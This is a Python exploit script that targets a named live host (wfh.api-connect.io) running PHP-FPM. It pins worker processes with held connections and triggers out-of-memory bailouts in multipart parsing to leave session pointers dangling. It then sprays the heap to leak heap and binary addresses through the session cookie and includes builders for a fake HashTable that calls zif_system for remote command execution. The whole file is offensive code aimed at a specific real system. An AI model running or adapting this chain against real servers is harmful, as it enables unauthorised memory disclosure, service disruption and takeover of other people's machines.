"""
Chain E custom for PHP-FPM (wfh.api-connect.io)
Adapted from eness/poc_109618.py + JoasASantos/exploit.py

Approach:
  Stage 0: Worker pinning — saturate FPM pool, leave 1 worker free
  Stage 1: OOM via huge multipart → dangling PS(id) → OOB read → leak heap chunk base
  Stage 2: OOM + heap spray → leak php-fpm binary base (via pDestructor = zval_ptr_dtor)
  Stage 3: OOM + fake HashTable spray → pDestructor = zif_system → RCE

Key differences from mod_php exploits:
  - FPM: php-fpm binary contains all symbols (no libphp.so)
  - FPM workers survive OOM (longjmp) and accept next request on same process
  - Worker pinning uses slow HTTP connections (same concept, different pool model)
  - Heap layout differs (no Apache allocations)

Usage:
  python chain_e_fpm_wfh.py --stage leak     # Only leak, no RCE
  python chain_e_fpm_wfh.py --stage full      # Full exploit chain
  python chain_e_fpm_wfh.py --stage pin-test  # Test worker pinning only
"""
from __future__ import annotations
import argparse, socket, ssl, struct, re, sys, time, threading, urllib.parse
from collections import Counter

# Target
HOST = "wfh.api-connect.io"
PORT = 443
PATH = "/"
TLS = True
TIMEOUT = 30.0

BOUNDARY = b"CCCCCCCCCC"

def _connect(host=HOST, port=PORT, timeout=TIMEOUT):
    for _ in range(5):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            if TLS:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            return s
        except OSError as e:
            time.sleep(0.3)
    raise ConnectionError(f"cannot connect to {host}:{port}")

def post_raw(body: bytes, boundary: bytes = BOUNDARY, path: str = PATH,
             extra_headers: str = "", read_cap: int = 1 << 20,
             timeout: float = TIMEOUT) -> bytes:
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"{extra_headers}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = _connect(timeout=timeout)
    s.settimeout(timeout)
    data = bytearray()
    def _reader():
        try:
            while len(data) < read_cap:
                chunk = s.recv(65536)
                if not chunk: break
                data.extend(chunk)
        except OSError: pass
    reader = threading.Thread(target=_reader, daemon=True)
    reader.start()
    try:
        s.sendall(hdr + body)
    except OSError: pass
    reader.join(timeout=timeout + 2)
    s.close()
    return bytes(data)

def get_raw(path: str = PATH, extra_headers: str = "",
            read_cap: int = 1 << 20, timeout: float = TIMEOUT) -> bytes:
    hdr = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"{extra_headers}"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = _connect(timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(hdr)
        data = bytearray()
        while len(data) < read_cap:
            chunk = s.recv(65536)
            if not chunk: break
            data.extend(chunk)
    except OSError: pass
    finally: s.close()
    return bytes(data)

def http_status(resp: bytes) -> int:
    m = re.match(rb"HTTP/\d\.\d\s+(\d+)", resp)
    return int(m.group(1)) if m else 0

def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie:\s*PHPSESSID=([^\r\n;]*)", resp)
    if not m: return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))

# ---------- Multipart helpers ----------

def part(name: bytes, data: bytes, filename: bytes = None) -> bytes:
    out = b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if filename is not None:
        out += b"; filename=\"" + filename + b"\"\r\nContent-Type: application/octet-stream"
    out += b"\r\n\r\n" + data + b"\r\n"
    return out

def end_boundary() -> bytes:
    return b"--" + BOUNDARY + b"--\r\n"

# ---------- Worker Pinning ----------

class PinState:
    def __init__(self):
        self.sockets = []
        self.workers = 0
        self.pinned = False

def estimate_workers(verbose=True) -> int:
    """Estimate FPM pm.max_children by saturating connections."""
    holders = []
    responding = 0
    try:
        for i in range(1, 20):
            try:
                s = _connect(timeout=5)
                req = (
                    f"GET {PATH} HTTP/1.1\r\n"
                    f"Host: {HOST}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Pad: {'A' * 2000}\r\n"
                ).encode()
                s.sendall(req)
                holders.append(s)
                time.sleep(0.15)
                # Quick test
                t = _connect(timeout=3)
                t.sendall(f"GET {PATH} HTTP/1.0\r\nHost: {HOST}\r\n\r\n".encode())
                t.settimeout(3)
                r = t.recv(256)
                t.close()
                if r: responding = i
                else: break
            except: break
    finally:
        for s in holders:
            try: s.close()
            except: pass
    result = max(1, responding)
    if verbose: print(f"  [pin] estimated workers: {result}")
    return result

def pin_workers(verbose=True) -> PinState:
    state = PinState()
    state.workers = estimate_workers(verbose)
    if state.workers <= 1:
        if verbose: print("  [pin] single worker or unable to estimate, no pinning")
        return state

    pin_count = state.workers - 1
    if verbose: print(f"  [pin] saturating {pin_count}/{state.workers} workers")

    def hold(idx, socks):
        try:
            s = _connect(timeout=130)
            s.settimeout(130)
            s.sendall((
                f"GET {PATH} HTTP/1.1\r\n"
                f"Host: {HOST}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode())
            socks[idx] = s
            end = time.monotonic() + 120
            while time.monotonic() < end:
                try:
                    s.recv(1)
                    time.sleep(0.5)
                except: break
        except: pass

    socks = [None] * pin_count
    for i in range(pin_count):
        threading.Thread(target=hold, args=(i, socks), daemon=True).start()
        time.sleep(0.1)
    time.sleep(1)
    state.sockets = [s for s in socks if s is not None]
    state.pinned = len(state.sockets) > 0
    if verbose: print(f"  [pin] {len(state.sockets)}/{pin_count} pinned")
    return state

def release_pin(state: PinState, verbose=True):
    for s in state.sockets:
        try: s.close()
        except: pass
    if verbose and state.pinned:
        print(f"  [pin] released {len(state.sockets)} connections")

# ---------- Stage 1: Heap leak via OOM + OOB read ----------

def build_oom_body(huge_mb: int = 12) -> bytes:
    """A1: OOM body — nested fields + huge value to exhaust memory_limit.

    After OOM bailout via longjmp, PS(id) and PS(http_session_vars) dangle.
    """
    out = bytearray()
    out += part(b"PHPSESSID", b"\x00")
    # Many fields to fill allocator pages
    for i in range(900):
        name = f"p{i:04d}".encode()
        out += part(name, b"x")
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    out += part(b"f", b"A" * 64, filename=b"a.txt")
    # Huge field to trigger OOM
    out += part(b"big", b"B" * (huge_mb * 1024 * 1024))
    out += end_boundary()
    return bytes(out)

def build_leak_body(n_fields: int = 841, fake_str_len: int = 0x1000,
                    sid: bytes = b"attacksid00000000001") -> bytes:
    """B1: After OOM, PS(id) points to freed memory.

    We spray fields whose values land at the freed address.
    One field has a forged zend_string header with large len →
    php_url_encode reads past the string → heap pointers leak via Set-Cookie.
    """
    out = bytearray()
    out += part(b"PHPSESSID", sid)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    for i in range(n_fields):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        out += part(str(1000 + i).encode(), val.encode())
    # Forge field: fake zend_string header
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, fake_str_len)  # len = OOB read window
    forge[0x18] = ord("L")  # tag byte
    out += part(b"1999", bytes(forge))
    out += end_boundary()
    return bytes(out)

def chunk_base_from_cookie(raw: bytes) -> int:
    """Extract 2MB-aligned heap chunk base from leaked pointers in cookie."""
    if len(raw) < 500:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c: return 0
    base, count = c.most_common(1)[0]
    return base if count >= 5 else 0

# ---------- Stage 2: Binary base leak ----------

def build_libphp_leak_body(n_arrays: int = 983, target_idx: int = 406,
                           expand_count: int = 16) -> bytes:
    """B1 variant: leak php-fpm binary base via pDestructor pointers.

    Create array fields whose HashTable contains pDestructor = zval_ptr_dtor.
    After OOM + OOB read, these pointers appear in the Set-Cookie data,
    revealing the php-fpm binary base address.
    """
    out = bytearray()
    out += part(b"PHPSESSID", b"\x00")
    for i in range(900):
        out += part(f"f{i:04d}"[:5].encode(), b"x" * 39)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    out += part(b"f", b"A" * 64, filename=b"a.txt")
    out += part(b"big", b"B" * (12 * 1024 * 1024))
    out += end_boundary()
    return bytes(out)

def build_libphp_read_body(n_arrays: int = 983, target_idx: int = 406,
                           sid: bytes = b"attacksid00000000001") -> bytes:
    out = bytearray()
    out += part(b"PHPSESSID", sid)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    for i in range(n_arrays):
        cnt = 16 if i == target_idx else 1
        for j in range(cnt):
            out += part(f"a{i:04d}[{j}]".encode(), b"x")
    out += end_boundary()
    return bytes(out)

def binary_base_from_cookie(raw: bytes) -> tuple[int, dict]:
    """Try to identify php-fpm base from leaked pointers.

    In FPM, zval_ptr_dtor is in the php-fpm binary itself.
    We look for repeated pointers that are page-aligned candidates.
    """
    if len(raw) < 16:
        return 0, {}
    ptrs: Counter[int] = Counter()
    for i in range(0, len(raw) - 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x500000000000 <= v < 0x800000000000:
            ptrs[v] += 1
    # Group by 4KB page
    pages: Counter[int] = Counter()
    for ptr, cnt in ptrs.items():
        pages[ptr & ~0xFFF] += cnt
    return 0, dict(ptrs.most_common(20))

# ---------- Stage 3: Fake HashTable RCE ----------

def build_forge_body(htdata: int, zif: int, cmd: bytes,
                     sid: bytes = b"attacksid00000000001") -> bytes:
    """B2: Spray fake HashTable with pDestructor = zif_system."""
    ht = build_fake_ht(htdata, zif, cmd)
    ref = build_fake_ref(htdata)
    out = bytearray()
    out += part(b"PHPSESSID", b"a" * 19)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p" * 3)
    for i in range(6):
        out += part(f"p{i:05d}".encode(), b"V" * 31)
    out += part(b"f", b"A" * 64, filename=b"a.txt")
    out += part(b"big", b"B" * (12 * 1024 * 1024))
    out += end_boundary()
    return bytes(out)  # OOM body

def build_fake_ht(htdata: int, zif: int, cmd: bytes) -> bytes:
    ht = bytearray(b"\x00" * 384)
    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)      # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                # pDestructor = zif_system
    # fake execute_data at +0x20
    E = 0x20
    struct.pack_into("<Q", ht, E+0x10, zif)              # return_value
    struct.pack_into("<I", ht, E+0x2C, 1)                # num_args = 1
    struct.pack_into("<Q", ht, E+0x50, htdata + 0x80)    # arg1 value
    struct.pack_into("<I", ht, E+0x58, 6)                # arg1 IS_STRING
    # fake zend_string at +0x80
    struct.pack_into("<II", ht, 0x80, 1, 0x106)          # gc: rc=1, IS_STRING
    struct.pack_into("<Q", ht, 0x90, len(cmd))            # len
    ht[0x98:0x98+len(cmd)] = cmd
    ht[0x98+len(cmd)] = 0
    return bytes(ht)

def build_fake_ref(htdata: int) -> bytes:
    ref = bytearray(b"X" * 55)
    struct.pack_into("<II", ref, 0x10, 1, 10)            # IS_REFERENCE
    struct.pack_into("<Q", ref, 0x18, htdata)             # val.value → fake HT
    struct.pack_into("<Q", ref, 0x20, 0x307)              # IS_ARRAY_EX
    return bytes(ref)

def build_rce_spray_body(ht_data: bytes, ref_data: bytes,
                         sid: bytes = b"attacksid00000000001") -> bytes:
    out = bytearray()
    out += part(b"PHPSESSID", sid)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    for i in range(15):
        out += part(f"a{i:030d}"[:31].encode(), ht_data)
    for i in range(2):
        out += part(f"f{i:02d}".encode(), ref_data)
    out += end_boundary()
    return bytes(out)


# ==================== MAIN ====================

def stage_pin_test(verbose=True):
    print("\n[Stage 0] Worker pinning test")
    state = pin_workers(verbose)
    if state.pinned:
        print(f"  [+] Pinned {len(state.sockets)} workers")
        # Test that we can still reach the server
        resp = get_raw()
        st = http_status(resp)
        print(f"  [+] Server still responds: HTTP {st}")
    else:
        print("  [-] Pinning failed or single worker")
    time.sleep(2)
    release_pin(state, verbose)

def stage_leak(verbose=True, huge_mb=12, retries=5):
    print("\n[Stage 1] Heap leak via OOM + OOB read")
    print(f"  target: {HOST}:{PORT}{PATH}")
    print(f"  huge_mb: {huge_mb}")

    for attempt in range(1, retries + 1):
        print(f"\n  [try {attempt}/{retries}]")

        # A: Trigger OOM → dangling PS(id)
        print("    A: Sending OOM payload...")
        oom_body = build_oom_body(huge_mb)
        resp = post_raw(oom_body, timeout=max(90, TIMEOUT))
        st = http_status(resp)
        print(f"       HTTP {st} ({len(resp)}b)")

        if st == 200:
            print("       [!] No OOM (HTTP 200), trying larger payload")
            # Try with bigger body
            oom_body = build_oom_body(huge_mb + 20)
            resp = post_raw(oom_body, timeout=120)
            st = http_status(resp)
            print(f"       Retry HTTP {st} ({len(resp)}b)")

        oom_ok = st in (0, 500, 502, 503)
        if not oom_ok and st == 200:
            # Check body for fatal error
            body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
            if b"memory" in body.lower() or b"Fatal" in body:
                oom_ok = True
                print("       [+] Fatal error in body → OOM confirmed")

        if not oom_ok:
            print(f"       [-] OOM not triggered (HTTP {st})")
            continue

        print("       [+] OOM likely triggered")
        time.sleep(0.3)

        # B: Send leak payload → read Set-Cookie
        print("    B: Sending leak payload...")
        leak_body = build_leak_body()
        resp = post_raw(leak_body, read_cap=9 << 20)
        st = http_status(resp)
        cookie = parse_cookie(resp)
        print(f"       HTTP {st}, cookie len={len(cookie)}")

        if len(cookie) < 100:
            print("       [-] Cookie too small, no leak")
            continue

        # Parse heap pointers
        chunk = chunk_base_from_cookie(cookie)
        if chunk:
            print(f"       [+] HEAP CHUNK BASE = 0x{chunk:x}")
        else:
            print("       [-] No consistent chunk base found")
            # Show raw pointer stats anyway
            ptrs: Counter[int] = Counter()
            for i in range(len(cookie) - 8):
                v = int.from_bytes(cookie[i:i+8], "little")
                if 0x7F0000000000 <= v < 0x800000000000:
                    ptrs[v & ~0x1FFFFF] += 1
            if ptrs:
                print(f"       Pointer candidates (2MB aligned):")
                for base, cnt in ptrs.most_common(5):
                    print(f"         0x{base:x} x{cnt}")
            else:
                # Try wider range for FPM (binary mapped lower)
                for i in range(len(cookie) - 8):
                    v = int.from_bytes(cookie[i:i+8], "little")
                    if 0x500000000000 <= v < 0x800000000000:
                        ptrs[v & ~0xFFF] += 1
                if ptrs:
                    print(f"       Wider pointer candidates (4KB aligned):")
                    for base, cnt in ptrs.most_common(10):
                        print(f"         0x{base:x} x{cnt}")
            continue

        # Stage 2: Binary base leak
        print("\n  [Stage 2] Binary base leak")
        time.sleep(0.5)

        # OOM again for fresh dangling pointers
        print("    A: OOM for stage 2...")
        oom2 = build_libphp_leak_body()
        resp = post_raw(oom2, timeout=90)
        st = http_status(resp)
        print(f"       HTTP {st}")
        time.sleep(0.3)

        print("    B: Reading binary pointers...")
        leak2 = build_libphp_read_body()
        resp = post_raw(leak2, read_cap=1 << 20)
        cookie2 = parse_cookie(resp)
        print(f"       cookie len={len(cookie2)}")

        if len(cookie2) >= 16:
            # First 8 bytes after PS(id) header = nNextFreeElement
            # Next 8 bytes = pDestructor (should be zval_ptr_dtor)
            p_dtor = int.from_bytes(cookie2[8:16], "little") if len(cookie2) >= 16 else 0
            print(f"       raw pDestructor candidate = 0x{p_dtor:x}")

            if 0x400000000000 <= p_dtor < 0x800000000000:
                # This might be zval_ptr_dtor in php-fpm binary
                base_candidate = p_dtor & ~0xFFF
                print(f"       [+] POTENTIAL BINARY BASE (page) = 0x{base_candidate:x}")
                print(f"       [+] pDestructor offset = 0x{p_dtor - base_candidate:x}")

            # Also scan full cookie for repeated pointers
            _, top_ptrs = binary_base_from_cookie(cookie2)
            if top_ptrs:
                print(f"       Top repeated pointers:")
                for ptr, cnt in list(top_ptrs.items())[:10]:
                    print(f"         0x{ptr:x} x{cnt}")

        return chunk

    print("\n  [-] All attempts failed")
    return 0

def stage_full(cmd="id", verbose=True, huge_mb=12, retries=5):
    """Full exploit: leak → forge → RCE"""
    print("\n[Full Chain E — FPM Custom]")

    # Pin workers first
    print("\n[Stage 0] Worker pinning")
    pin = pin_workers(verbose)

    try:
        chunk = stage_leak(verbose, huge_mb, retries)
        if not chunk:
            print("\n[-] Heap leak failed, cannot proceed to RCE")
            return False

        # For RCE we'd need:
        # 1. Known zif_system offset in php-fpm binary
        # 2. Known ht_offset for the heap layout
        # Without knowing PHP version, we'd need to brute-force or use the leaked binary base
        print("\n[!] Heap leak succeeded — RCE requires php-fpm binary offsets")
        print("[!] PHP version unknown → cannot calculate zif_system address")
        print("[!] To proceed: need 'nm' or 'readelf' output from matching PHP build")
        return True
    finally:
        release_pin(pin, verbose)

def main():
    ap = argparse.ArgumentParser(description="Chain E custom for PHP-FPM")
    ap.add_argument("--stage", choices=["pin-test", "leak", "full"], default="leak")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--retries", type=int, default=5)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    verbose = not args.quiet

    if args.stage == "pin-test":
        stage_pin_test(verbose)
    elif args.stage == "leak":
        stage_leak(verbose, args.huge_mb, args.retries)
    elif args.stage == "full":
        stage_full(args.cmd, verbose, args.huge_mb, args.retries)

if __name__ == "__main__":
    main()
